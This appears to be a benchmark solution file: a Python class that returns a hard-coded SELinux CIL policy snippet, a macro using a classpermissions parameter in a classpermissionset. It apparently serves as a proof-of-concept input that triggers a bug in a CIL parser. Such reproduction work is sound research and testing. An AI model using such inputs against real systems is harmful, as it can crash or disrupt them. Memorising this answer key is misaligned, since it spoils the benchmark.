class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'''(class myclass)
(macro mac ((classpermissions cp))
  (classpermissionset set cp)
)
(mac (classpermissions (myclass (read))))
'''
        return poc
